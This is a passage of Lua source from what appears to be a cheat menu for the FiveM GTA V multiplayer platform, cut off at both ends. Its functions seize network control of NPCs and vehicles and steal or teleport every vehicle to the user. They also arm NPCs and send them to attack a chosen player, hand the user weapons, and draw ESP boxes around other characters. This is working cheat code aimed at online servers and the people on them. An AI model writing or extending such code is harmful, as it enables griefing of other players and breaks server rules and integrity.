_diff_002_o_whi","lowr_diff_002_p_whi","lowr_diff_003_a_whi","lowr_diff_003_b_whi","lowr_diff_003_c_whi","lowr_diff_003_d_whi","lowr_diff_003_e_whi","lowr_diff_003_f_whi","lowr_diff_003_g_whi","lowr_diff_003_h_whi","lowr_diff_003_i_whi","lowr_diff_003_j_whi","lowr_diff_003_k_whi","lowr_diff_003_l_whi","lowr_diff_003_m_whi","lowr_diff_003_n_whi","lowr_diff_003_o_whi","lowr_diff_003_p_whi","lowr_diff_004_a_whi","lowr_diff_004_b_whi","lowr_diff_004_c_whi","lowr_diff_004_d_whi","lowr_diff_004_e_whi","lowr_diff_004_f_whi","lowr_diff_004_g_whi","lowr_diff_004_h_whi","lowr_diff_004_i_whi","lowr_diff_004_j_whi","lowr_diff_004_k_whi","lowr_diff_004_l_whi","lowr_diff_004_m_whi","lowr_diff_004_n_whi","lowr_diff_004_o_whi","lowr_diff_004_p_whi","lowr_diff_005_a_whi","lowr_diff_005_b_whi","lowr_diff_005_c_whi","lowr_diff_005_d_whi","lowr_diff_005_e_whi","lowr_diff_005_f_whi","lowr_diff_005_g_whi","lowr_diff_005_h_whi","lowr_diff_005_i_whi","lowr_diff_005_j_whi","lowr_diff_005_k_whi","lowr_diff_005_l_whi","lowr_diff_005_m_whi","lowr_diff_005_n_whi","lowr_diff_005_o_whi","lowr_diff_005_p_whi","lowr_diff_006_a_whi","lowr_diff_006_b_whi","lowr_diff_006_c_whi","lowr_diff_006_d_whi","lowr_diff_006_e_whi","lowr_diff_006_f_whi","lowr_diff_006_g_whi","lowr_diff_006_h_whi","lowr_diff_006_i_whi","lowr_diff_006_j_whi","lowr_diff_006_k_whi","lowr_diff_006_l_whi","lowr_diff_006_m_whi","lowr_diff_006_n_whi","lowr_diff_006_o_whi","lowr_diff_006_p_whi","lowr_diff_007_a_whi","lowr_diff_007_b_whi","lowr_diff_007_c_whi","lowr_diff_007_d_whi","lowr_diff_007_e_whi","lowr_diff_007_f_whi","lowr_diff_007_g_whi","lowr_diff_007_h_whi","lowr_diff_007_i_whi","lowr_diff_007_j_whi","lowr_diff_007_k_whi","lowr_diff_007_l_whi","lowr_diff_007_m_whi","lowr_diff_007_n_whi","lowr_diff_007_o_whi","lowr_diff_007_p_whi","lowr_diff_008_a_whi","lowr_diff_008_b_whi","lowr_diff_008_c_whi","lowr_diff_008_d_whi","lowr_diff_008_e_whi","lowr_diff_008_f_whi","lowr_diff_008_g_whi","lowr_diff_008_h_whi","lowr_diff_008_i_whi","lowr_diff_008_j_whi","lowr_diff_008_k_whi","lowr_diff_008_l_whi","lowr_diff_008_m_whi","lowr_diff_008_n_whi","lowr_diff_008_o_whi","lowr_diff_008_p_whi","lowr_diff_009_a_whi","lowr_diff_009_b_whi","lowr_diff_009_c_whi","lowr_diff_009_d_whi","lowr_diff_009_e_whi","lowr_diff_009_f_whi","lowr_diff_009_g_whi","lowr_diff_009_h_whi","lowr_diff_009_i_whi","lowr_diff_009_j_whi","lowr_diff_009_k_whi","lowr_diff_009_l_whi","lowr_diff_009_m_whi","lowr_diff_009_n_whi","lowr_diff_009_o_whi","lowr_diff_009_p_whi","lowr_diff_010_a_whi","lowr_diff_010_b_whi","lowr_diff_010_c_whi","lowr_diff_010_d_whi","lowr_diff_010_e_whi","lowr_diff_010_f_whi","lowr_diff_010_g_whi","lowr_diff_010_h_whi","lowr_diff_010_i_whi","lowr_diff_010_j_whi","lowr_diff_010_k_whi","lowr_diff_010_l_whi","lowr_diff_010_m_whi","lowr_diff_010_n_whi","lowr_diff_010_o_whi","lowr_diff_010_p_whi","lowr_diff_011_a_whi","lowr_diff_011_b_whi","lowr_diff_011_c_whi","lowr_diff_011_d_whi","lowr_diff_011_e_whi","lowr_diff_011_f_whi","lowr_diff_011_g_whi","lowr_diff_011_h_whi","lowr_diff_011_i_whi","lowr_diff_011_j_whi","lowr_diff_011_k_whi","lowr_diff_011_l_whi","lowr_diff_011_m_whi","lowr_diff_011_n_whi","lowr_diff_011_o_whi","lowr_diff_011_p_whi","lowr_diff_012_a_whi","lowr_diff_012_b_whi","lowr_diff_012_c_whi","lowr_diff_012_d_whi","lowr_diff_012_e_whi","lowr_diff_012_f_whi","lowr_diff_012_g_whi","lowr_diff_012_h_whi","lowr_diff_012_i_whi","lowr_diff_012_j_whi","lowr_diff_012_k_whi","lowr_diff_012_l_whi","lowr_diff_012_m_whi","lowr_diff_012_n_whi","lowr_diff_012_o_whi","lowr_diff_012_p_whi","lowr_diff_013_a_whi","lowr_diff_013_b_whi","lowr_diff_013_c_whi","lowr_diff_013_d_whi","lowr_diff_013_e_whi","lowr_diff_013_f_whi","lowr_diff_013_g_whi","lowr_diff_013_h_whi","lowr_diff_013_i_whi","lowr_diff_013_j_whi","lowr_diff_013_k_whi","lowr_diff_013_l_whi","lowr_diff_013_m_whi","lowr_diff_013_n_whi","lowr_diff_013_o_whi","lowr_diff_013_p_whi","lowr_diff_014_a_whi","lowr_diff_014_b_whi","lowr_diff_014_c_whi","lowr_diff_014_d_whi","lowr_diff_014_e_whi","lowr_diff_014_f_whi","lowr_diff_014_g_whi","lowr_diff_014_h_whi","lowr_diff_014_i_whi","lowr_diff_014_j_whi","lowr_diff_014_k_whi","lowr_diff_014_l_whi","lowr_diff_014_m_whi","lowr_diff_014_n_whi","lowr_diff_014_o_whi","lowr_diff_014_p_whi","lowr_diff_015_a_whi","lowr_diff_015_b_whi","lowr_diff_015_c_whi","lowr_diff_015_d_whi","lowr_diff_015_e_whi","lowr_diff_015_f_whi","lowr_diff_015_g_whi","lowr_diff_015_h_whi","lowr_diff_015_i_whi","lowr_diff_015_j_whi","lowr_diff_015_k_whi","lowr_diff_015_l_whi","lowr_diff_015_m_whi","lowr_diff_015_n_whi","lowr_diff_015_o_whi","lowr_diff_015_p_whi","task_diff_000_a_uni","task_diff_001_a_uni","task_diff_001_b_uni","task_diff_001_c_uni","task_diff_001_d_uni","task_diff_001_e_uni","task_diff_002_a_uni","task_diff_002_b_uni","task_diff_002_c_uni","task_diff_002_d_uni","task_diff_002_e_uni","task_diff_003_a_uni","task_diff_003_b_uni","task_diff_003_c_uni","task_diff_003_d_uni","task_diff_003_e_uni","task_diff_004_a_uni","task_diff_004_b_uni","task_diff_004_c_uni","task_diff_004_d_uni","task_diff_004_e_uni","task_diff_005_a_uni","task_diff_005_b_uni","task_diff_005_c_uni","task_diff_005_d_uni","task_diff_005_e_uni","task_diff_006_a_uni","task_diff_006_b_uni","task_diff_006_c_uni","task_diff_006_d_uni","task_diff_006_e_uni","task_diff_007_a_uni","task_diff_007_b_uni","task_diff_007_c_uni","task_diff_007_d_uni","task_diff_007_e_uni","task_diff_008_a_uni","task_diff_008_b_uni","task_diff_008_c_uni","task_diff_008_d_uni","task_diff_008_e_uni","task_diff_009_a_uni","task_diff_009_b_uni","task_diff_009_c_uni","task_diff_009_d_uni","task_diff_009_e_uni","teef_diff_000_a_uni","teef_diff_001_a_uni","teef_diff_001_b_uni","teef_diff_001_c_uni","teef_diff_002_a_uni","teef_diff_002_b_uni","teef_diff_002_c_uni","teef_diff_003_a_uni","teef_diff_003_b_uni","teef_diff_003_c_uni","teef_diff_004_a_uni","teef_diff_004_b_uni","teef_diff_004_c_uni","teef_diff_004_d_uni","teef_diff_004_e_uni","teef_diff_004_f_uni","teef_diff_004_g_uni","teef_diff_004_h_uni","teef_diff_004_i_uni","teef_diff_004_j_uni","teef_diff_004_k_uni","teef_diff_004_l_uni","teef_diff_004_m_uni","teef_diff_004_n_uni","teef_diff_004_o_uni","teef_diff_004_p_uni","teef_diff_005_a_uni","teef_diff_005_b_uni","teef_diff_005_c_uni","teef_diff_005_d_uni","teef_diff_005_e_uni","teef_diff_005_f_uni","teef_diff_006_a_uni","teef_diff_006_b_uni","teef_diff_006_c_uni","teef_diff_006_d_uni","teef_diff_006_e_uni","teef_diff_006_f_uni","teef_diff_007_a_uni","teef_diff_008_a_uni","teef_diff_009_a_uni","teef_diff_010_a_uni","teef_diff_010_b_uni","teef_diff_010_c_uni","teef_diff_010_d_uni","teef_diff_010_e_uni","teef_diff_010_f_uni","teef_diff_010_g_uni","teef_diff_010_h_uni","teef_diff_010_i_uni","teef_diff_010_j_uni","teef_diff_010_k_uni","teef_diff_010_l_uni","teef_diff_010_m_uni","teef_diff_010_n_uni","teef_diff_010_o_uni","teef_diff_010_p_uni","teef_diff_011_a_uni","teef_diff_011_b_uni","teef_diff_011_c_uni","teef_diff_011_d_uni","teef_diff_011_e_uni","teef_diff_011_f_uni","teef_diff_011_g_uni","teef_diff_011_h_uni","teef_diff_011_i_uni","teef_diff_011_j_uni","teef_diff_011_k_uni","teef_diff_011_l_uni","teef_diff_011_m_uni","teef_diff_011_n_uni","teef_diff_011_o_uni","teef_diff_011_p_uni","teef_diff_012_a_uni","teef_diff_012_b_uni","teef_diff_012_c_uni","teef_diff_012_d_uni","teef_diff_012_e_uni","teef_diff_012_f_uni","teef_diff_012_g_uni","teef_diff_012_h_uni","teef_diff_012_i_uni","teef_diff_012_j_uni","teef_diff_012_k_uni","teef_diff_012_l_uni","teef_diff_012_m_uni","teef_diff_012_n_uni","teef_diff_012_o_uni","teef_diff_012_p_uni","teef_diff_013_a_uni","teef_diff_014_a_uni","teef_diff_015_a_uni","uppr_diff_000_a_whi","uppr_diff_001_a_whi","uppr_diff_002_a_whi","uppr_diff_003_a_whi","uppr_diff_004_a_whi","uppr_diff_005_a_whi","uppr_diff_006_a_whi","uppr_diff_007_a_whi","uppr_diff_008_a_whi","uppr_diff_009_a_whi","uppr_diff_010_a_whi","uppr_diff_011_a_whi","uppr_diff_012_a_whi","uppr_diff_013_a_whi","uppr_diff_014_a_whi","uppr_diff_015_a_whi"}
               for _, prop in pairs(Textures) do 
               RemoveReplaceTexture("mp_m_freemode_01\\"..prop, prop)
               end
           end)
       end
   end
   
           function sum.f.CarsToWaypoint()
               local blip = sum.f.GetFirstBlipInfoId(8)
               if sum.f.DoesBlipExist(blip) then
                   for ped in sum.f.enumeratePeds() do
                       if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                       local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                       if sum.f.DoesEntityExist(vehicle) then
                           sum.f.requestControlOnce(vehicle)
                           sum.f.NetworkRequestControlOfEntity(ped)
                           for k, v in pairs(sum.f.GetActivePlayers()) do
                           local coords = sum.f.GetBlipInfoIdCoord(blip)
                           sum.f.TaskVehicleDriveToCoord(ped,vehicle,coords,sum.f.GetVehicleMaxSpeed(vehicle),0,-1848994066,1076,10.0) -- 2883621
                           sum.f.SetDriveTaskDrivingStyle(ped, 1076) --2883621
                           sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 10.0)
                       end
                   end
               end
           end
       end
   end
   
   
   
   function sum.f.rgb(frequency)
       local result = {}
       local curtime = sum.f.GetGameTimer() / 2000
       result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
       result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
       result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
       return result
   end
   
   function sum.f.ambientGlow(p, r, g, b, distance, shadow)
       local bones = {0, 23553, 24817, 24818, 24816, 11816,31086, 0xcc4d, 0x9995, 0x3779, 0xE0FD,0x5C57,0x192A,0x9995,0xB1C5,0xEEEB,0x49D9,0x9D4D,0x6E5C,0xDEAD, 0x5c01}
           for i = 1, #bones do 
               local head = sum.f.GetPedBoneCoords(p, bones[i], 0.0, 0.0, 0.0)
               sum.f.DrawLightWithRangeAndShadow(head.x, head.y, head.z + 0.3 , r, g, b, distance, shadow)
           end
       end
       
       function sum.f.ambientGlowwhite(p, distance, shadow)
           local bones = {31086, 0x796e}
           for i = 1, #bones do 
               local head = sum.f.GetPedBoneCoords(p, bones[i], 0.0, 0.0, 0.0)
               sum.f.DrawLightWithRangeAndShadow(head.x, head.y, head.z + 0.3 , 255, 255, 255, distance, shadow)
           end
       end
       
       function sum.f.ambientGlowlegs(p, r, g, b, distance, shadow)
           local bones = {0x3779, 0xcc4d}
           for i = 1, #bones do 
               local head = sum.f.GetPedBoneCoords(p, bones[i], 0.0, 0.0, 0.0)
               sum.f.DrawLightWithRangeAndShadow(head.x, head.y, head.z - 5 , r, g, b, distance, shadow)
           end
       end
   
       function sum.f.CarsToMe()
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                   if sum.f.DoesEntityExist(vehicle) then
                       sum.f.requestControlOnce(vehicle)
                       sum.f.NetworkRequestControlOfEntity(ped)
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                       local coords = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
                       sum.f.TaskVehicleDriveToCoord(ped,vehicle,coords,sum.f.GetVehicleMaxSpeed(vehicle),0,-1848994066,1076,10.0) -- 2883621
                       sum.f.SetDriveTaskDrivingStyle(ped, 1076) --2883621
                       sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 10.0)
                   end
               end
           end
       end
   end
   
   
   function sum.f.SetEntityToWaypoint()
       local WaypointHandle = sum.f.GetFirstBlipInfoId(8)
   
       if sum.f.DoesBlipExist(WaypointHandle) then
           local waypointCoords = sum.f.GetBlipInfoIdCoord(WaypointHandle)
         for height = 1, 1000 do
           sum.f.SetPedCoordsKeepVehicle(sum.f.PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)
   
             local foundGround, zPos = sum.f.GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)
   
             if foundGround then
               sum.f.sendNotification('Teleported to waypoint','Teleportations')
               sum.f.SetPedCoordsKeepVehicle(sum.f.PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)
   
                 break
             end
   
             Citizen.Wait(0)
         end
     else
       sum.f.sendNotification('Please place a waypoint','Teleportations')  end
   end
   
   function sum.f.GlifeCarStealer()
       for delu in sum.f.enumerateVehicles() do
           local x, y, z = table.unpack(sum.f.GetEntityCoords(delu))
           local name = sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(delu))
           sum.f.requestControlOnce(delu)
           --if GetEntityModel(delu) == GetHashKey("ztype") then
           for k, v in pairs(sum.f.GetActivePlayers()) do
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(v, 0)) then 
                   --print("Not possible")
               else
                   sum.f.SetEntityCoords(delu, sum.f.GetEntityCoords(sum.f.PlayerPedId()))
               end
           end
               --print("[five^2sense^0] Vehicle " .. name .. " Coords: ^2X^0: " .. x .. " ^2Y^0: " .. y .. " ^2X^0: " .. z .. "")
           --end
       end
   end
   
   function sum.f.SetEntityToNearestVehicle()
       local vehicle = sum.f.GetClosestVehicle(sum.f.GetEntityCoords(sum.f.PlayerPedId()), 5000.0, 0, 70)
       local vehnamenotif = sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId())))
       if not sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId()) then
           sum.f.sendNotification('Teleported to '..vehnamenotif,'Teleportations')
       end
       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId()) then
           sum.f.sendNotification('You are already in '..vehnamenotif,'Teleportations')
       end
       if vehicle ~= nil then
           sum.f.SetPedIntoVehicle(sum.f.PlayerPedId(), vehicle, -1)
       end
   end
   
   function sum.f.SetEntityToChoosenCoords()
       local x = sum.f.kinput("Enter ~b~X~s~ Value", "", 10)
       local y = sum.f.kinput("Enter ~b~Y~s~ Value", "", 10)
       local z = sum.f.kinput("Enter ~b~Z~s~ Value", "", 10)
       local entity
       if x ~= "" and y ~= "" and z ~= "" then
           if
               sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) and
                   sum.f.GetPedInVehicleSeat(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), 0), -1) ==
                       sum.f.PlayerPedId()
            then
               entity = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), 0)
           else
               entity = sum.f.PlayerPedId()
           end
           if entity then
               sum.f.sendNotification('Teleported to ~b~X~s~: '..x..' ~b~Y~s~: '..y..' ~b~Z~s~: '..z,'Teleportations')
               sum.f.SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1, 0, 0, 1)
           end
       end
   end
   
   
   
   function sum.f.TeleportCarsToaPlayer()
       for vehicle2 in sum.f.enumerateVehicles() do
           sum.f.requestControlOnce(vehicle2)
           sum.f.SetEntityCoords(vehicle2, sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)))
       end
           for ped in sum.f.enumeratePeds() do
               if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local coords = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
                   local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                   if sum.f.DoesEntityExist(vehicle) then
                       sum.f.requestControlOnce(vehicle)
                       sum.f.NetworkRequestControlOfEntity(ped)
                       sum.f.SetEntityCoords(vehicle, coords)
                   end
               end
           end
       end
   
   
       function sum.f.CarsToWaypointATTACK()
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                   if sum.f.DoesEntityExist(vehicle) then
                       sum.f.requestControlOnce(vehicle)
                       sum.f.NetworkRequestControlOfEntity(ped)
                       for k, v in pairs(sum.f.GetActivePlayers()) do
                       local coords = sum.f.GetBlipInfoIdCoord(sum.f.GetFirstBlipInfoId(8))
                       sum.f.TaskVehicleDriveToCoord(ped,vehicle,coords,sum.f.GetVehicleMaxSpeed(vehicle),0,-1848994066,1076,10.0)
                       sum.f.SetDriveTaskDrivingStyle(ped, 1076)
                       sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_MICROSMG"), 200, 1, 1)
                       sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(v), 0, 16)
                       sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 10.0)
                   end
               end
           end
       end
   end
   
   
   function sum.f.GlifeWeapons()
       sum.f.GiveWeaponToPed(sum.f.PlayerPedId(), sum.f.GetHashKey("WEAPON_ASSAULTRIFLE_MK2"), 133, false, true)
   end
   
   function sum.f.CarsNoGravity()
           for ped in sum.f.enumeratePeds() do
               if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               local vehicle = sum.f.GetVehiclePedIsUsing(ped)
               if sum.f.DoesEntityExist(vehicle) then
                   sum.f.requestControlOnce(vehicle)
                   sum.f.NetworkRequestControlOfEntity(ped)
                   sum.f.SetDriveTaskDrivingStyle(ped, 1076)
                   sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 100)
                   sum.f.ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 0.05, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
       end
   end
   
   
       function sum.f.AttackPlayer()
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local coords = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
                   local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                   if sum.f.DoesEntityExist(vehicle) then
                       sum.f.requestControlOnce(vehicle)
                       sum.f.NetworkRequestControlOfEntity(ped)
                       sum.f.TaskVehicleDriveToCoord(ped,vehicle,coords,sum.f.GetVehicleMaxSpeed(vehicle),0,-1848994066,1076,10.0)
                       sum.f.SetDriveTaskDrivingStyle(ped, 1076)
                       sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_MICROSMG"), 200, 1, 1)
                       sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
                       sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 20.0)
                   end
               end
           end
       end
   
   function sum.f.SetNeonsOnVeh()
       local p = sum.f.PlayerPedId()
       local veh = sum.f.GetVehiclePedIsIn(p, false) 
       sum.f.SetVehicleNeonLightEnabled(veh, 0, true)
       sum.f.SetVehicleNeonLightEnabled(veh, 1, true)
       sum.f.SetVehicleNeonLightEnabled(veh, 2, true)
       sum.f.SetVehicleNeonLightEnabled(veh, 3, true)
   end
   
   function sum.f.SetNeonsOnVehNPC()
       for p in sum.f.enumeratePeds() do
           local veh = sum.f.GetVehiclePedIsIn(p, false) 
           sum.f.SetVehicleNeonLightEnabled(veh, 0, true)
           sum.f.SetVehicleNeonLightEnabled(veh, 1, true)
           sum.f.SetVehicleNeonLightEnabled(veh, 2, true)
           sum.f.SetVehicleNeonLightEnabled(veh, 3, true)
       end
   end
   
   
       function sum.f.DriveToPlayer()
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local coords = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
                   local vehicle = sum.f.GetVehiclePedIsUsing(ped)
               if sum.f.DoesEntityExist(vehicle) then
                   sum.f.requestControlOnce(vehicle)
                   sum.f.NetworkRequestControlOfEntity(ped)
                   sum.f.TaskVehicleDriveToCoord(ped,vehicle,coords,sum.f.GetVehicleMaxSpeed(vehicle),0,-1848994066,1076,10.0)
                   sum.f.SetDriveTaskDrivingStyle(ped, 1076)
                   sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 20.0)
               end
           end
       end
   end
   
   
   function sum.f.cornerbox(ped)
       local coordXMin = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, 0.9)
       local coordYPlus = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, -0.9)
       local bool, screenX, screenY = sum.f.GetScreenCoordFromWorldCoord(coordXMin.x, coordXMin.y, coordXMin.z)
       local bool2, screenX2, screenY2 = sum.f.GetScreenCoordFromWorldCoord(coordYPlus.x, coordYPlus.y, coordYPlus.z)
       local resX, resY = sum.f.GetActiveScreenResolution()
       local coord = sum.f.GetEntityCoords(ped)
       local x, y, z = coord.x, coord.y, coord.z
       local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false) 
       if d < sum.s['visuals-distance'].value then
       if bool and bool2 and not sum.f.IsEntityDead(ped) and sum.f.IsEntityOnScreen(ped)  then
           if sum.c['visuals-corner-box-vischeck'] then 
               if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), ped, 19) then 
               local r, g, b = sum.s['visuals-corner-vis-r'].value, sum.s['visuals-corner-vis-g'].value, sum.s['visuals-corner-vis-b'].value
               sum.f.DrawRect((screenY - screenY2) / 7, (screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, (screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               sum.f.DrawRect((screenY - screenY2) / 7, -(screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, -(screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               
               sum.f.DrawRect(-(screenY - screenY2) / 11, -(screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               sum.f.DrawRect((screenY - screenY2) / 11, -(screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 11, (screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               sum.f.DrawRect((screenY - screenY2) / 11, (screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               else
                   local r, g, b = sum.s['visuals-corner-r'].value, sum.s['visuals-corner-g'].value, sum.s['visuals-corner-b'].value
                   sum.f.DrawRect((screenY - screenY2) / 7, (screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
                   sum.f.DrawRect(-(screenY - screenY2) / 7, (screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
                   sum.f.DrawRect((screenY - screenY2) / 7, -(screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
                   sum.f.DrawRect(-(screenY - screenY2) / 7, -(screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
                   
                   sum.f.DrawRect(-(screenY - screenY2) / 11, -(screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
                   sum.f.DrawRect((screenY - screenY2) / 11, -(screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
                   sum.f.DrawRect(-(screenY - screenY2) / 11, (screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
                   sum.f.DrawRect((screenY - screenY2) / 11, (screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               end
           else
               local r, g, b = sum.s['visuals-corner-r'].value, sum.s['visuals-corner-g'].value, sum.s['visuals-corner-b'].value
               sum.f.DrawRect((screenY - screenY2) / 7, (screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, (screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               sum.f.DrawRect((screenY - screenY2) / 7, -(screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, -(screenY - screenY2) / 2.3, 1 / resX, (screenY - screenY2) / 8, r, g, b, 255)
               
               sum.f.DrawRect(-(screenY - screenY2) / 11, -(screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               sum.f.DrawRect((screenY - screenY2) / 11, -(screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 11, (screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
               sum.f.DrawRect((screenY - screenY2) / 11, (screenY - screenY2) / 2, (screenY - screenY2) / 9.5, 1 / resY, r, g, b, 255)
           end
           if sum.c['visuals-fillcorner-box'] then 
               sum.f.DrawRect(0, 0.0, (screenY - screenY2) / 3.5, screenY - screenY2, 0, 0, 0, sum.s['visuals-corner-alpha'].value)
               end
           end
       end
   end
   
   function sum.f.boundingbox(ped)
       local coordXMin = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, 0.9)
       local coordYPlus = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, -0.9)
       
       local bool, screenX, screenY = sum.f.GetScreenCoordFromWorldCoord(coordXMin.x, coordXMin.y, coordXMin.z)
       local bool2, screenX2, screenY2 = sum.f.GetScreenCoordFromWorldCoord(coordYPlus.x, coordYPlus.y, coordYPlus.z)
       local resX, resY = sum.f.GetActiveScreenResolution()
       local coord = sum.f.GetEntityCoords(ped)
       local x, y, z = coord.x, coord.y, coord.z
       local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false) 
       if d < sum.s['visuals-distance'].value then
       if bool and bool2 and not sum.f.IsEntityDead(ped) and sum.f.IsEntityOnScreen(ped)  then
           if sum.c['visuals-boundibg-box-outline'] then 
               sum.f.DrawRect((screenY - screenY2) / 7, 0, 3 / resX, (screenY - screenY2) + 2.5 / resY, 0, 0, 0, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, 0, 3 / resX, (screenY - screenY2) + 2.5 / resY, 0, 0, 0, 255)
               sum.f.DrawRect(0, (screenY - screenY2) / 2, ((screenY - screenY2) / 3.48) + 2.5 / resX, 3 / resY, 0, 0, 0, 255)
               sum.f.DrawRect(0, -(screenY - screenY2) / 2, ((screenY - screenY2) / 3.48) + 2.5 / resX, 3 / resY, 0, 0, 0, 255)
           end
           if sum.c['visuals-bounding-box-vischeck'] then 
               if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), ped, 19) then 
               local r, g, b = sum.s['visuals-bounding-vis-r'].value, sum.s['visuals-bounding-vis-g'].value, sum.s['visuals-bounding-vis-b'].value
               sum.f.DrawRect((screenY - screenY2) / 7, 0, 1 / resX, screenY - screenY2, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, 0, 1 / resX, screenY - screenY2, r, g, b, 255)
               sum.f.DrawRect(0, (screenY - screenY2) / 2, (screenY - screenY2) / 3.48, 1 / resY, r, g, b, 255)
               sum.f.DrawRect(0, -(screenY - screenY2) / 2, (screenY - screenY2) / 3.48, 1 / resY, r, g, b, 255)
               else
                   local r, g, b = sum.s['visuals-bounding-r'].value, sum.s['visuals-bounding-g'].value, sum.s['visuals-bounding-b'].value
                   sum.f.DrawRect((screenY - screenY2) / 7, 0, 1 / resX, screenY - screenY2, r, g, b, 255)
                   sum.f.DrawRect(-(screenY - screenY2) / 7, 0, 1 / resX, screenY - screenY2, r, g, b, 255)
                   sum.f.DrawRect(0, (screenY - screenY2) / 2, (screenY - screenY2) / 3.48, 1 / resY, r, g, b, 255)
